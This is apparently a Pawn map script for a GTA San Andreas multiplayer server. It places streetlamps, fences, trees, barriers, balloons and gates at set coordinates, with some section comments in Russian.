CreateDynamicObject(1360,1473.8900146,-1742.8699951,13.3190002,0.0000000,0.0000000,0.0000000); //object(cj_bush_prop3) (2)
CreateDynamicObject(792,1540.7459717,-1747.8900146,13.0469999,0.0000000,0.0000000,0.0000000); //object(aw_streettree1) (1)
CreateDynamicObject(3462,1495.8840332,-1749.7359619,15.9589996,0.0000000,0.0000000,270.0000000); //object(csrangel_lvs) (1)
CreateDynamicObject(3462,1466.4489746,-1749.7840576,15.9589996,0.0000000,0.0000000,270.0000000); //object(csrangel_lvs) (2)
CreateDynamicObject(1286,1483.8900146,-1727.0000000,13.1260004,0.0000000,0.0000000,0.0000000); //object(newstandnew4) (1)
CreateDynamicObject(1315,1489.8690186,-1729.9460449,15.6520004,0.0000000,0.0000000,90.0000000); //object(trafficlight1) (1)
CreateDynamicObject(1315,1472.1910400,-1734.7270508,15.6520004,0.0000000,0.0000000,270.0000000); //object(trafficlight1) (2)
CreateDynamicObject(1366,1478.6259766,-1737.4539795,13.1599998,0.0000000,0.0000000,0.0000000); //object(cj_firehydrant) (1)
CreateDynamicObject(1223,1502.8193359,-1744.3876953,12.5469999,0.0000000,0.0000000,90.0000000); //object(lampost_coast) (1)
CreateDynamicObject(1223,1511.0069580,-1744.3740234,13.0469999,0.0000000,0.0000000,90.0000000); //object(lampost_coast) (2)
CreateDynamicObject(1223,1496.5539551,-1744.3649902,12.5469999,0.0000000,0.0000000,90.0000000); //object(lampost_coast) (3)
CreateDynamicObject(1223,1490.1450195,-1744.3669434,12.5469999,0.0000000,0.0000000,90.0000000); //object(lampost_coast) (4)
CreateDynamicObject(1223,1483.8110352,-1744.3680420,12.5469999,0.0000000,0.0000000,90.0000000); //object(lampost_coast) (5)
CreateDynamicObject(1223,1478.3559570,-1744.3570557,12.5469999,0.0000000,0.0000000,90.0000000); //object(lampost_coast) (6)
CreateDynamicObject(1223,1471.9709473,-1744.4139404,12.5469999,0.0000000,0.0000000,90.0000000); //object(lampost_coast) (7)
CreateDynamicObject(1223,1465.6030273,-1744.3530273,12.5469999,0.0000000,0.0000000,90.0000000); //object(lampost_coast) (8)
CreateDynamicObject(1223,1459.3399658,-1744.3590088,12.5469999,0.0000000,0.0000000,90.0000000); //object(lampost_coast) (9)
CreateDynamicObject(1223,1450.8790283,-1744.3189697,13.0469999,0.0000000,0.0000000,90.0000000); //object(lampost_coast) (10)
CreateDynamicObject(19338,1421.1319580,-1707.3900146,65.9919968,0.0000000,0.0000000,0.0000000); //object(hot_air_balloon07) (1)
CreateDynamicObject(19337,1516.4959717,-1668.2609863,103.6320038,0.0000000,0.0000000,0.0000000); //object(hot_air_balloon06) (1)
CreateDynamicObject(19335,1527.3459473,-1744.4959717,103.8840027,0.0000000,0.0000000,0.0000000); //object(hot_air_balloon04) (1)
CreateDynamicObject(983,1517.9799805,-1723.9370117,13.2299995,0.0000000,0.0000000,0.0000000); //object(fenceshit3) (11)
CreateDynamicObject(982,1505.1884766,-1720.7412109,13.2299995,0.0000000,0.0000000,90.0000000); //object(fenceshit) (7)
CreateDynamicObject(983,1485.9709473,-1720.7419434,13.2299995,0.0000000,0.0000000,90.0000000); //object(fenceshit3) (14)
CreateDynamicObject(983,1489.1796875,-1720.7617188,13.2299995,0.0000000,0.0000000,90.0000000); //object(fenceshit3) (15)
CreateDynamicObject(983,1476.3280029,-1720.7419434,13.2299995,0.0000000,0.0000000,90.0000000); //object(fenceshit3) (16)
CreateDynamicObject(982,1460.3769531,-1720.7419434,13.2299995,0.0000000,0.0000000,90.0000000); //object(fenceshit) (8)
CreateDynamicObject(983,1441.2180176,-1723.9749756,13.2299995,0.0000000,0.0000000,0.0000000); //object(fenceshit3) (17)
CreateDynamicObject(983,1444.4033203,-1720.7773438,13.2299995,0.0000000,0.0000000,90.0000000); //object(fenceshit3) (18)
CreateDynamicObject(11489,1479.6400146,-1706.1300049,13.0469999,0.0000000,0.0000000,0.0000000); //object(dam_statues) (1)
CreateDynamicObject(1346,1467.9909668,-1715.2669678,14.3979998,0.0000000,0.0000000,0.0000000); //object(cj_phone_kiosk2) (1)
CreateDynamicObject(1231,1505.3199463,-1720.5329590,15.5270004,0.0000000,0.0000000,0.0000000); //object(streetlamp2) (1)
CreateDynamicObject(1231,1517.8359375,-1720.4687500,15.5270004,0.0000000,0.0000000,0.0000000); //object(streetlamp2) (2)
CreateDynamicObject(1231,1511.7187500,-1720.5205078,15.5270004,0.0000000,0.0000000,0.0000000); //object(streetlamp2) (3)
CreateDynamicObject(1231,1498.9179688,-1720.5169678,15.5270004,0.0000000,0.0000000,0.0000000); //object(streetlamp2) (4)
CreateDynamicObject(1231,1492.5329590,-1720.5269775,15.5270004,0.0000000,0.0000000,0.0000000); //object(streetlamp2) (5)
CreateDynamicObject(1231,1486.0639648,-1720.5030518,15.5270004,0.0000000,0.0000000,0.0000000); //object(streetlamp2) (6)
CreateDynamicObject(1231,1476.4110107,-1720.4909668,15.5270004,0.0000000,0.0000000,0.0000000); //object(streetlamp2) (7)
CreateDynamicObject(1231,1470.1059570,-1720.5069580,15.5270004,0.0000000,0.0000000,0.0000000); //object(streetlamp2) (8)
CreateDynamicObject(1231,1463.7249756,-1720.4909668,15.5270004,0.0000000,0.0000000,0.0000000); //object(streetlamp2) (9)
CreateDynamicObject(1231,1457.2869873,-1720.4969482,15.5270004,0.0000000,0.0000000,0.0000000); //object(streetlamp2) (10)
CreateDynamicObject(1231,1450.8909912,-1720.5439453,15.5270004,0.0000000,0.0000000,0.0000000); //object(streetlamp2) (11)
CreateDynamicObject(1231,1444.5369873,-1720.5489502,15.5270004,0.0000000,0.0000000,0.0000000); //object(streetlamp2) (12)
CreateDynamicObject(1232,1489.0469971,-1706.2070312,15.6840000,0.0000000,0.0000000,0.0000000); //object(streetlamp1) (1)
CreateDynamicObject(1232,1489.1319580,-1715.4320068,15.6840000,0.0000000,0.0000000,0.0000000); //object(streetlamp1) (2)
CreateDynamicObject(1232,1488.9229736,-1695.4189453,15.6840000,0.0000000,0.0000000,0.0000000); //object(streetlamp1) (3)
CreateDynamicObject(1232,1488.9589844,-1684.3050537,15.6840000,0.0000000,0.0000000,0.0000000); //object(streetlamp1) (4)
CreateDynamicObject(1232,1468.8310547,-1680.9599609,15.6840000,0.0000000,0.0000000,0.0000000); //object(streetlamp1) (5)
CreateDynamicObject(1232,1468.8070068,-1711.9000244,15.6840000,0.0000000,0.0000000,0.0000000); //object(streetlamp1) (6)
CreateDynamicObject(1232,1468.9824219,-1692.3242188,15.6840000,0.0000000,0.0000000,0.0000000); //object(streetlamp1) (7)
CreateDynamicObject(1232,1468.9013672,-1702.9853516,15.6840000,0.0000000,0.0000000,0.0000000); //object(streetlamp1) (8)
CreateDynamicObject(1251,1457.5129395,-1723.8229980,12.5000000,0.0000000,0.0000000,0.0000000); //object(smashbar) (1)
CreateDynamicObject(1251,1444.4091797,-1723.8320312,12.5000000,0.0000000,0.0000000,0.0000000); //object(smashbar) (3)
CreateDynamicObject(1251,1451.0234375,-1723.8457031,12.5000000,0.0000000,0.0000000,0.0000000); //object(smashbar) (4)
CreateDynamicObject(1251,1463.8339844,-1723.8050537,12.5000000,0.0000000,0.0000000,0.0000000); //object(smashbar) (5)
CreateDynamicObject(1251,1492.5340576,-1723.8000488,12.5000000,0.0000000,0.0000000,0.0000000); //object(smashbar) (6)
CreateDynamicObject(1251,1470.2138672,-1723.8261719,12.5000000,0.0000000,0.0000000,0.0000000); //object(smashbar) (7)
CreateDynamicObject(1251,1476.4765625,-1723.8056641,12.5000000,0.0000000,0.0000000,0.0000000); //object(smashbar) (8)
CreateDynamicObject(1251,1498.9980469,-1723.8249512,12.5000000,0.0000000,0.0000000,0.0000000); //object(smashbar) (9)
CreateDynamicObject(1251,1505.4250488,-1723.8000488,12.5000000,0.0000000,0.0000000,0.0000000); //object(smashbar) (10)
CreateDynamicObject(1251,1511.7600098,-1723.8360596,12.5000000,0.0000000,0.0000000,0.0000000); //object(smashbar) (11)
CreateDynamicObject(997,1479.5240479,-1723.9069824,12.5469999,0.0000000,0.0000000,90.0000000); //object(lhouse_barrier3) (1)
CreateDynamicObject(997,1489.8900146,-1727.0999756,12.5000000,0.0000000,0.0000000,90.0000000); //object(lhouse_barrier3) (2)
CreateDynamicObject(997,1479.5263672,-1727.0312500,12.5469999,0.0000000,0.0000000,90.0000000); //object(lhouse_barrier3) (3)
CreateDynamicObject(997,1489.8769531,-1720.6999512,12.5469999,0.0000000,0.0000000,270.0000000); //object(lhouse_barrier3) (4)
CreateDynamicObject(640,1514.8050537,-1720.3349609,13.4940004,0.0000000,0.0000000,90.0000000); //object(kb_planter_bush2) (1)
CreateDynamicObject(640,1489.3179932,-1720.3869629,13.4940004,0.0000000,0.0000000,90.0000000); //object(kb_planter_bush2) (2)
CreateDynamicObject(640,1508.6083984,-1720.3525391,13.4940004,0.0000000,0.0000000,90.0000000); //object(kb_planter_bush2) (3)
CreateDynamicObject(640,1502.0878906,-1720.2978516,13.4940004,0.0000000,0.0000000,90.0000000); //object(kb_planter_bush2) (4)
CreateDynamicObject(640,1467.0169678,-1720.3339844,13.4940004,0.0000000,0.0000000,90.0000000); //object(kb_planter_bush2) (5)
CreateDynamicObject(640,1473.2822266,-1720.3535156,13.4940004,0.0000000,0.0000000,90.0000000); //object(kb_planter_bush2) (6)
CreateDynamicObject(640,1460.5699463,-1720.3349609,13.4940004,0.0000000,0.0000000,90.0000000); //object(kb_planter_bush2) (7)
CreateDynamicObject(640,1447.7390137,-1720.3430176,13.4940004,0.0000000,0.0000000,90.0000000); //object(kb_planter_bush2) (8)
CreateDynamicObject(640,1454.1748047,-1720.3642578,13.4940004,0.0000000,0.0000000,90.0000000); //object(kb_planter_bush2) (9)
CreateDynamicObject(638,1478.0150146,-1720.3669434,13.4940004,0.0000000,0.0000000,90.0000000); //object(kb_planter_bush) (1)
CreateDynamicObject(638,1442.9482422,-1720.3964844,13.4940004,0.0000000,0.0000000,90.0000000); //object(kb_planter_bush) (2)
CreateDynamicObject(638,1484.2590332,-1720.3919678,13.4940004,0.0000000,0.0000000,90.0000000); //object(kb_planter_bush) (3)
CreateDynamicObject(640,1495.7978516,-1720.3359375,13.4940004,0.0000000,0.0000000,90.0000000); //object(kb_planter_bush2) (10)
CreateDynamicObject(1256,1489.4720459,-1722.3320312,13.2060003,0.0000000,0.0000000,0.0000000); //object(stonebench1) (1)
CreateDynamicObject(1256,1489.4730225,-1725.4079590,13.2060003,0.0000000,0.0000000,0.0000000); //object(stonebench1) (2)
CreateDynamicObject(1216,1486.8020020,-1727.0419922,13.2390003,0.0000000,0.0000000,180.0000000); //object(phonebooth1) (1)
CreateDynamicObject(3532,1538.2760010,-1747.6590576,13.7290001,0.0000000,0.0000000,0.0000000); //object(triadbush) (1)
CreateDynamicObject(3660,1521.5849609,-1745.9200439,14.4499998,0.0000000,0.0000000,0.0000000); //object(lasairfbed_las) (2)
CreateDynamicObject(3660,1440.2359619,-1745.9019775,14.4499998,0.0000000,0.0000000,0.0000000); //object(lasairfbed_las) (4)
CreateDynamicObject(3660,1420.6130371,-1745.9150391,14.4499998,0.0000000,0.0000000,0.0000000); //object(lasairfbed_las) (5)
CreateDynamicObject(3660,1541.1939697,-1745.9029541,14.4499998,0.0000000,0.0000000,0.0000000); //object(lasairfbed_las) (6)
CreateDynamicObject(1597,1465.7590332,-1745.2629395,15.2040005,0.0000000,0.0000000,90.0000000); //object(cntrlrsac1) (1)
CreateDynamicObject(3660,1547.3599854,-1745.8530273,14.4499998,0.0000000,0.0000000,0.0000000); //object(lasairfbed_las) (7)
CreateDynamicObject(3660,1412.2290039,-1745.9000244,14.4499998,0.0000000,0.0000000,0.0000000); //object(lasairfbed_las) (8)
CreateDynamicObject(3660,1555.9580078,-1756.9320068,14.4499998,0.0000000,0.0000000,90.0000000); //object(lasairfbed_las) (9)
CreateDynamicObject(3660,1403.1459961,-1757.0009766,14.4499998,0.0000000,0.0000000,90.0000000); //object(lasairfbed_las) (10)
CreateDynamicObject(1597,1495.3129883,-1745.3890381,15.2040005,0.0000000,0.0000000,90.0000000); //object(cntrlrsac1) (2)
CreateDynamicObject(2954,1483.6910400,-1730.4060059,12.3130999,0.0000000,90.0000000,180.0000000); //object(kmb_ot) (4)
CreateDynamicObject(2954,1483.6992188,-1731.8691406,12.3140001,0.0000000,90.0000000,179.9945068); //object(kmb_ot) (4)
CreateDynamicObject(2954,1483.6169434,-1735.1090088,12.3130999,0.0000000,90.0000000,179.9945068); //object(kmb_ot) (4)
CreateDynamicObject(2954,1483.6059570,-1736.5310059,12.3130999,0.0000000,90.0000000,179.9945068); //object(kmb_ot) (4)
CreateDynamicObject(2954,1483.6074219,-1733.6269531,12.3130999,0.0000000,90.0000000,179.9945068); //object(kmb_ot) (4)
CreateDynamicObject(2954,1483.6660156,-1728.8819580,12.3130999,0.0000000,90.0000000,179.9945068); //object(kmb_ot) (4)
CreateDynamicObject(2954,1483.6904297,-1730.4052734,12.3130999,0.0000000,90.0000000,179.9945068); //object(kmb_ot) (4)
//
CreateObject(3095, -1935.9470, -1087.5679, 34, 0, 270, 0); // Объект 0
CreateObject(3095, -1935.9462, -1078.6999, 34, 0, 270, 0); // Объект 1
CreateObject(3095, -1935.9462, -1069.8000, 34, 0, 270, 0); // Объект 2
CreateObject(3095, -1935.9462, -1060.8000, 34, 0, 270, 0); // Объект 3
CreateObject(3095, -1935.9462, -1051, 34, 0, 270, 0); // Объект 4
CreateObject(3095, -1935.9462, -1042, 34, 0, 270, 0); // Объект 5
CreateObject(3095, -1935.9462, -1033, 34, 0, 270, 0); // Объект 6
CreateObject(3095, -1935.9462, -1024, 34, 0, 270, 0); // Объект 7
CreateObject(3095, -1935.9699, -1020, 34, 0, 270, 0); // Объект 8
CreateObject(19435, -1953.7299, -1015.3400, 32.9220, 0, 0, 90); // Объект 10
CreateObject(19435, -1953.7294, -1015.3398, 36.2999, 0, 0, 90); // Объект 11
CreateObject(19435, -1939.2099, -1016.2329, 32.9220, 0, 0, 0); // Объект 12
CreateObject(19435, -1938.5, -1015.3398, 36.4000, 0, 0, 90); // Объект 13
CreateObject(19425, -1939.6650, -1009.9730, 31.0160, 0, 0, 0); // Объект 14
CreateObject(19425, -1946.2629, -1009.9730, 31.0160, 0, 0, 0); // Объект 15
CreateObject(19425, -1942.9687, -1009.9726, 31.0160, 0, 0, 0); // Объект 16
CreateObject(19425, -1949.5579, -1009.9730, 31.0160, 0, 0, 0); // Объект 17
CreateObject(19425, -1952.8570, -1009.9730, 31.0160, 0, 0, 0); // Объект 18
CreateObject(1535, -1954.5500, -1054.4899, 31.1720, 0, 0, 90); // Объект 19
CreateObject(640, -1936.8079, -1089.3199, 31.8719, 0, 0, 0); // Объект 20
CreateObject(640, -1936.8076, -1084.0999, 31.8719, 0, 0, 0); // Объект 21
CreateObject(640, -1936.8076, -1079, 31.8719, 0, 0, 0); // Объект 22
CreateObject(640, -1936.8076, -1072.5999, 31.8719, 0, 0, 0); // Объект 23
CreateObject(640, -1936.8076, -1067.4000, 31.8719, 0, 0, 0); // Объект 24
CreateObject(640, -1936.8076, -1062.0999, 31.8719, 0, 0, 0); // Объект 25
CreateObject(640, -1936.8089, -1058.4250, 31.8700, 0, 0, 0); // Объект 26
CreateObject(639, -1954.5244, -1053.1611, 35.9960, 0, 0, 0); // Объект 27
CreateObject(8613, -1958.5059, -1043.5570, 54.9500, 0, 0, 0); // Объект 28
CreateObject(983, -1953.5360, -1036.2320, 58.7400, 0, 0, 0); // Объект 29
CreateObject(983, -1960.0279, -1039.3540, 58.7400, 0, 0, 90); // Объект 30
CreateObject(1535, -1953.5300, -1034.8299, 52.3499, 0, 0, 90); // Объект 31
CreateObject(1215, -1976.7270, -1023.9689, 58.9160, 0, 0, 0); // Объект 32
CreateObject(1215, -1965.5478, -1039.3066, 58.9140, 0, 0, 0); // Объект 33
CreateObject(1215, -1972.0126, -1036.7861, 58.9160, 0, 0, 0); // Объект 34
CreateObject(1215, -1976.8183, -1030.4248, 58.9160, 0, 0, 0); // Объект 35
CreateObject(1215, -1972.0150, -1017.8629, 58.9160, 0, 0, 0); // Объект 36
CreateObject(1215, -1965.6080, -1015.3720, 58.9119, 0, 0, 0); // Объект 37
CreateObject(1215, -1959.0839, -1017.9409, 58.9160, 0, 0, 0); // Объект 38
CreateObject(1215, -1954.5169, -1023.9630, 58.9160, 0, 0, 0); // Объект 39
CreateObject(1215, -1953.6550, -1030.4580, 58.9140, 0, 0, 0); // Объект 40
CreateObject(1535, -1954.5400, -1050.0999, 31.1720, 0, 0, 270); // Объект 41
CreateObject(1617, -1936.7199, -1015.2210, 38.875, 0, 0, 270); // Объект 42
CreateObject(1617, -1935.9470, -1015.9550, 38.8720, 0, 0, 180); // Объект 43
CreateObject(19435, -1938.5, -1015.3398, 32.9220, 0, 0, 90); // Объект 44
CreateObject(19435, -1939.2099, -1016.2324, 36.4000, 0, 0, 0); // Объект 45
CreateObject(19408, -1939.2099, -1018.6389, 32.9220, 0, 0, 0); // Объект 46
CreateObject(19435, -1939.2099, -1021.0380, 32.9220, 0, 0, 0); // Объект 47
CreateObject(19391, -1937.6949, -1021.9180, 32.9220, 0, 0, 90); // Объект 48
CreateObject(1649, -1939.25, -1018.5440, 32.8380, 0, 0, 270); // Объект 49
CreateObject(19435, -1939.2099, -1017.8400, 36.4000, 0, 0, 0); // Объект 50
CreateObject(19435, -1939.2099, -1019.4500, 36.4000, 0, 0, 0); // Объект 51
CreateObject(19435, -1939.2099, -1021, 36.4000, 0, 0, 0); // Объект 52
CreateObject(19435, -1938.5, -1021.8900, 36.4000, 0, 0, 90); // Объект 53
CreateObject(19435, -1937, -1021.8900, 36.4000, 0, 0, 90); // Объект 54
CreateObject(1499, -1938.4670, -1021.9470, 31.1720, 0, 0, 0); // Объект 55
CreateObject(2066, -1938.2669, -1015.9902, 31.1720, 0, 0, 0); // Объект 56
CreateObject(2066, -1938.8330, -1015.9902, 31.1720, 0, 0, 0); // Объект 57
CreateObject(2606, -1938.9499, -1018.7039, 34.2820, 10, 0, 90); // Объект 58
CreateObject(1999, -1938.6209, -1019.2000, 31.1720, 0, 0, 90); // Объект 59
CreateObject(1720, -1938.1590, -1018.4359, 31.1720, 0, 0, 294); // Объект 60
CreateObject(1720, -1938.5899, -1019.9639, 31.1720, 0, 0, 90); // Объект 61
CreateObject(1665, -1938.8819, -1019.0269, 32.0099, 0, 0, 0); // Объект 62
CreateObject(1551, -1939.0019, -1018.7249, 32.2249, 0, 0, 0); // Объект 63
CreateObject(2241, -1938.5629, -1015.8400, 33.0909, 0, 0, 0); // Объект 64
CreateObject(19362, -1936.4899, -1018.6560, 36.4000, 0, 0, 0); // Объект 65
CreateObject(19435, -1936.4899, -1021.0460, 36.4000, 0, 0, 0); // Объект 66
CreateObject(19435, -1936.4899, -1021.0458, 32.9220, 0, 0, 0); // Объект 67
CreateObject(19362, -1936.4899, -1018.6552, 32.9220, 0, 0, 0); // Объект 68
CreateObject(970, -1956.6359, -1010.4069, 31.7229, 0, 0, 0); // Объект 69
CreateObject(970, -1935.9375, -1012.7949, 31.7269, 0, 0, 90); // Объект 70
CreateObject(970, -1961, -1010.4062, 31.7229, 0, 0, 0); // Объект 71
CreateObject(970, -1965.4000, -1010.4062, 31.7229, 0, 0, 0); // Объект 72
CreateObject(970, -1969.8000, -1010.4062, 31.7229, 0, 0, 0); // Объект 73
CreateObject(970, -1974.3000, -1010.4062, 31.7229, 0, 0, 0); // Объект 74
CreateObject(970, -1982.5080, -1026.5999, 31.7280, 0, 0, 90); // Объект 75
CreateObject(970, -1982.5078, -1017.6894, 31.7280, 0, 0, 90); // Объект 76
CreateObject(970, -1982.5078, -1022.1992, 31.7280, 0, 0, 90); // Объект 77
CreateObject(970, -1982.5078, -1031.0999, 31.7280, 0, 0, 90); // Объект 78
CreateObject(970, -1980.1290, -1035.2120, 31.7280, 0, 0, 0); // Объект 79
CreateObject(2921, -1938.0460, -1015.2210, 36.6800, 0, 0, 334); // Объект 80
CreateObject(2921, -1977.2199, -1024.9749, 36.6599, 0, 0, 300); // Объект 81
CreateObject(1886, -1954.5250, -1049.7120, 36.2540, 0, 0, 34); // Объект 82
//======================================Заправка========================================
CreateDynamicObject(1368,1928.8597412,-1768.9700928,13.2366114,0.0000000,0.0000000,90.0000000); //object(cj_blocker_bench)(1)
CreateDynamicObject(661,1946.9682617,-1800.7133789,12.5468750,0.0000000,0.0000000,0.0000000); //object(pinetree07)(1)
CreateDynamicObject(661,1946.5233154,-1810.1282959,12.5468740,0.0000000,0.0000000,0.0000000); //object(pinetree07)(2)
CreateDynamicObject(661,1947.6052246,-1818.2581787,12.5468750,0.0000000,0.0000000,0.0000000); //object(pinetree07)(3)
CreateDynamicObject(661,1935.7523193,-1800.6052246,12.5468740,0.0000000,0.0000000,0.0000000); //object(pinetree07)(4)
CreateDynamicObject(661,1926.6137695,-1800.3065185,12.5468750,0.0000000,0.0000000,0.0000000); //object(pinetree07)(5)
CreateDynamicObject(970,1942.3116455,-1779.0917969,13.1921063,0.0000000,0.0000000,270.0000000); //object(fencesmallb)(1)
CreateDynamicObject(970,1942.2972412,-1774.9736328,13.1921063,0.0000000,0.0000000,270.0000000); //object(fencesmallb)(5)
CreateDynamicObject(970,1951.7752685,-1777.4379883,13.0983563,0.0000000,0.0000000,270.0000000); //object(fencesmallb)(6)
CreateDynamicObject(970,1942.2877197,-1766.7159424,13.1921063,0.0000000,0.0000000,270.0000000); //object(fencesmallb)(7)
CreateDynamicObject(970,1940.9649658,-1766.7895508,13.1921063,0.0000000,0.0000000,270.0000000); //object(fencesmallb)(8)
CreateDynamicObject(970,1940.9736328,-1770.8916016,13.1921063,0.0000000,0.0000000,270.0000000); //object(fencesmallb)(9)
CreateDynamicObject(970,1940.9517822,-1775.0122070,13.1921063,0.0000000,0.0000000,270.0000000); //object(fencesmallb)(10)
CreateDynamicObject(970,1940.9465332,-1779.1241455,13.1921063,0.0000000,0.0000000,270.0000000); //object(fencesmallb)(11)
CreateDynamicObject(970,1942.3017578,-1770.8554688,13.1921063,0.0000000,0.0000000,270.0000000); //object(fencesmallb)(12)
CreateDynamicObject(970,1951.7752685,-1773.3059082,13.0983563,0.0000000,0.0000000,270.0000000); //object(fencesmallb)(13)
CreateDynamicObject(970,1951.7752685,-1769.1873779,13.0983563,0.0000000,0.0000000,270.0000000); //object(fencesmallb)(14)
CreateDynamicObject(970,1929.4315185,-1762.3438721,13.0983563,0.0000000,0.0000000,0.0000000); //object(fencesmallb)(15)
CreateDynamicObject(970,1951.7744141,-1765.0644531,13.0983563,0.0000000,0.0000000,270.0000000); //object(fencesmallb)(16)
CreateDynamicObject(970,1925.3057861,-1762.3438721,13.0905533,0.0000000,0.0000000,0.0000000); //object(fencesmallb)(17)
CreateDynamicObject(970,1921.1779785,-1762.3438721,13.0905533,0.0000000,0.0000000,0.0000000); //object(fencesmallb)(18)
CreateDynamicObject(970,1917.0517578,-1762.3438721,13.0905533,0.0000000,0.0000000,0.0000000); //object(fencesmallb)(19)
CreateDynamicObject(970,1901.7551269,-1762.4523926,13.0983563,0.0000000,0.0000000,0.0000000); //object(fencesmallb)(20)
CreateDynamicObject(2010,1928.9100342,-1773.9603272,12.5600004,0.0000000,0.0000000,0.0000000); //object(nu_plant3_ofc)(1)
CreateDynamicObject(2010,1928.9100342,-1778.9000244,12.5600004,0.0000000,0.0000000,0.0000000); //object(nu_plant3_ofc)(2)
CreateDynamicObject(638,1928.6363525,-1780.7857666,13.2439089,0.0000000,0.0000000,0.0000000); //object(kb_planter_bush)(1)
CreateDynamicObject(638,1928.6363525,-1784.4615478,13.2439089,0.0000000,0.0000000,0.0000000); //object(kb_planter_bush)(2)
CreateDynamicObject(1412,1900.9995117,-1794.1276856,13.8208351,0.0000000,0.0000000,90.0000000); //object(dyn_mesh_2)(1)
CreateDynamicObject(970,1903.8322754,-1764.4949951,13.0983563,0.0000000,0.0000000,270.0000000); //object(fencesmallb)(23)
CreateDynamicObject(970,1903.8295898,-1768.6289062,13.0983563,0.0000000,0.0000000,270.0000000); //object(fencesmallb)(24)
CreateDynamicObject(970,1903.8424072,-1772.7629394,13.0983563,0.0000000,0.0000000,270.0000000); //object(fencesmallb)(25)
CreateDynamicObject(970,1903.8374023,-1776.8741455,13.0983563,0.0000000,0.0000000,270.0000000); //object(fencesmallb)(26)
CreateDynamicObject(970,1903.8388672,-1780.9969482,13.0983563,0.0000000,0.0000000,270.0000000); //object(fencesmallb)(27)
CreateDynamicObject(970,1903.8353272,-1785.1193848,13.0983563,0.0000000,0.0000000,270.0000000); //object(fencesmallb)(28)
CreateDynamicObject(970,1908.8297119,-1790.2348633,12.9342938,0.0000000,0.0000000,270.0000000); //object(fencesmallb)(29)
CreateDynamicObject(970,1903.8305664,-1795.4560547,13.0905533,0.0000000,0.0000000,270.0000000); //object(fencesmallb)(30)
CreateDynamicObject(970,1903.8305664,-1793.3671875,13.0905533,0.0000000,0.0000000,270.0000000); //object(fencesmallb)(31)
CreateDynamicObject(970,1903.8300781,-1789.2333984,13.0983563,0.0000000,0.0000000,270.0000000); //object(fencesmallb)(32)
CreateDynamicObject(970,1908.8284912,-1786.0599365,12.9342938,0.0000000,0.0000000,270.0000000); //object(fencesmallb)(33)
CreateDynamicObject(970,1908.8295898,-1781.8851318,12.9342938,0.0000000,0.0000000,270.0000000); //object(fencesmallb)(34)
CreateDynamicObject(717,1953.2025147,-1777.3808594,12.6599999,0.0000000,0.0000000,0.0000000); //object(sm_bevhiltreepv)(1)
CreateDynamicObject(717,1953.0805664,-1772.2550049,12.6599999,0.0000000,0.0000000,0.0000000); //object(sm_bevhiltreepv)(2)
CreateDynamicObject(717,1953.2117920,-1767.3079834,12.6599999,0.0000000,0.0000000,0.0000000); //object(sm_bevhiltreepv)(3)
CreateDynamicObject(717,1935.0073242,-1794.5999756,12.6599999,0.0000000,0.0000000,0.0000000); //object(sm_bevhiltreepv)(5)
CreateDynamicObject(717,1951.1687012,-1794.5999756,12.6599999,0.0000000,0.0000000,0.0000000); //object(sm_bevhiltreepv)(6)
CreateDynamicObject(717,1943.2199707,-1794.5999756,12.6599999,0.0000000,0.0000000,0.0000000); //object(sm_bevhiltreepv)(7)
CreateDynamicObject(717,1906.4260254,-1795.5686035,12.6599999,0.0000000,0.0000000,0.0000000); //object(sm_bevhiltreepv)(8)
CreateDynamicObject(717,1928.7056885,-1761.1918945,12.6599999,0.0000000,0.0000000,0.0000000); //object(sm_bevhiltreepv)(9)
CreateDynamicObject(717,1917.8706055,-1761.1918945,12.6599999,0.0000000,0.0000000,0.0000000); //object(sm_bevhiltreepv)(10)
CreateDynamicObject(717,1923.3520508,-1761.1918945,12.6599999,0.0000000,0.0000000,0.0000000); //object(sm_bevhiltreepv)(11)
CreateDynamicObject(717,1904.7658691,-1761.4147949,12.5468740,0.0000000,0.0000000,0.0000000); //object(sm_bevhiltreepv)(12)
CreateDynamicObject(1215,1941.6254883,-1764.8056641,13.2049484,0.0000000,0.0000000,0.0000000); //object(bollardlight)(1)
CreateDynamicObject(1215,1941.6668701,-1781.1573486,13.2049484,0.0000000,0.0000000,0.0000000); //object(bollardlight)(2)
CreateDynamicObject(1215,1928.3718262,-1766.4354248,13.1111984,0.0000000,0.0000000,0.0000000); //object(bollardlight)(4)
CreateDynamicObject(1215,1928.6442871,-1786.2274170,13.1111984,0.0000000,0.0000000,0.0000000); //object(bollardlight)(6)
CreateDynamicObject(1215,1952.0721435,-1779.4152832,13.1111984,0.0000000,0.0000000,0.0000000); //object(bollardlight)(7)
CreateDynamicObject(1215,1952.1346435,-1763.0438232,13.1111984,0.0000000,0.0000000,0.0000000); //object(bollardlight)(8)
CreateDynamicObject(1215,1953.4969482,-1796.2236328,13.1111984,0.0000000,0.0000000,0.0000000); //object(bollardlight)(9)
CreateDynamicObject(1215,1908.9862060,-1792.2857666,12.9471359,0.0000000,0.0000000,0.0000000); //object(bollardlight)(10)
CreateDynamicObject(1215,1913.7686768,-1787.1437988,13.1111984,0.0000000,0.0000000,0.0000000); //object(bollardlight)(11)
CreateDynamicObject(1215,1908.9354248,-1776.7514648,12.9471359,0.0000000,0.0000000,0.0000000); //object(bollardlight)(13)
CreateDynamicObject(1215,1913.3834228,-1776.8840332,12.9471359,0.0000000,0.0000000,0.0000000); //object(bollardlight)(14)
CreateDynamicObject(1215,1915.1068115,-1762.0889893,13.1111984,0.0000000,0.0000000,0.0000000); //object(bollardlight)(15)
CreateDynamicObject(1215,1904.3374023,-1762.4617920,13.1111984,0.0000000,0.0000000,0.0000000); //object(bollardlight)(16)
CreateDynamicObject(1215,1908.3548584,-1771.6082764,13.1111984,0.0000000,0.0000000,0.0000000); //object(bollardlight)(17)
CreateDynamicObject(1215,1913.9208984,-1771.6047363,12.9471359,0.0000000,0.0000000,0.0000000); //object(bollardlight)(18)
CreateDynamicObject(1215,1931.4161377,-1762.1751709,13.1111984,0.0000000,0.0000000,0.0000000); //object(bollardlight)(19)
CreateDynamicObject(1216,1915.0000000,-1765.9000244,13.2388773,0.0000000,0.0000000,180.0000000); //object(phonebooth1)(1)
CreateDynamicObject(11417,1907.6046143,-1768.1472168,17.4207230,0.0000000,0.0000000,0.0000000); //object(xenonsign2_sfse)(2)
// ТЮНИНГ И ПЕИНТСПРЕЙ
CreateDynamicObject(971,1042.62402344,-1026.02539062,30.89780045,0.00000000,0.00000000,0.00000000); //object(subwaygate) (2)
CreateDynamicObject(985,2644.96240234,-2039.15563965,11.05000019,0.00000000,0.00000000,0.00000000); //object(gate_autor) (2)
CreateDynamicObject(985,2386.40356445,1043.56250000,10.19540024,0.00000000,0.00000000,0.00000000); //object(gate_autor) (3)
